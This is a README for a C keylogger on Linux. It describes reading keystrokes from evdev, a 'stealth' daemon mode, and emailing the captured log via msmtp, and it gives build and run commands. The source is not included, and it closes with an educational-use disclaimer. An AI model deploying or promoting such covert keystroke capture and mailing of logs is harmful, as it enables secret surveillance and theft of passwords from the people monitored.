# Linux Keylogger

A simple yet effective userspace keylogger for Linux systems. It reads directly from the Linux Input Subsystem (evdev), making it independent of X11 or Wayland.

## Features

- **Rootless (mostly)**: Only requires read permissions on `/dev/input/event*`.
- **Auto-Detection**: Automatically finds the connected keyboard device.
- **Daemon Mode**: Can run silently in the background.
- **Lightweight**: Minimal C implementation with no external dependencies.
- **German Layout Support**: Optimized for DE keyboard layout (Umlaute, Sonderzeichen).
- **Email Notification**: Can send the log file to an email address upon termination.

## Prerequisites

To use the email notification feature, you need `msmtp` installed and configured.
On Debian/Ubuntu:
```bash
sudo apt install msmtp
```
You must configure `~/.msmtprc` with your email account details.

## Compilation

Compile with `gcc` to create a small binary: (keylog):

```bash
make
```

## Usage

The program needs permission to read input devices. You usually need to run it as root (sudo) or add your user to the `input` group.

### Basic Usage (Auto-Detect)
This will automatically find the keyboard and log keys to `log.txt`.
```bash
sudo ./keylog log.txt
```

### Daemon Mode (stealth)
Runs the keylogger in the background. The terminal prompt returns immediately.
```bash
sudo ./keylog -d log.txt
```

### Manual Device Selection
If you have multiple devices or auto-detection fails, you can specify the event file manually:
```bash
sudo ./keylog /dev/input/eventX log.txt
```

### Email Notification
To send the log file via email when the program stops, use the `-m` (or `--mail`) flag:
```bash
sudo ./keylog -m user@example.com log.txt
```
The email will be sent with the subject "Keylog Version 1.5".

## Stopping the Keylogger

If running in **foreground**: Press `Ctrl+C`.

If running in **daemon mode**:
```bash
sudo pkill keylog
```

## Disclaimer

**Educational Use Only.**

This software is intended for educational purposes and security research (e.g., understanding input handling in Linux).
Do not use this software on systems you do not own or do not have explicit permission to monitor.
Unlawful interception of data is a serious crime. The author is not responsible for any misuse of this software.
